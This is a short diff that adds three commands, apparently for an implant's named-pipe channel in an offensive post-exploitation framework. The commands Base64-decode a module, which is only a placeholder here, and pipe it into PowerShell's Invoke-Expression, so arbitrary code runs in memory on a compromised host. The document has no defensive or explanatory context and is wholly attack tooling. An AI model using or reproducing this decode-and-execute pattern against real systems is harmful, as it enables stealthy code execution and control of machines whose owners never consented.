@@ -1,0 +1,3 @@
+pbind-command '$mod = "Base64 Module"'
+pbind-command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mod))|iex"
+pbind-command "invoke-mod"
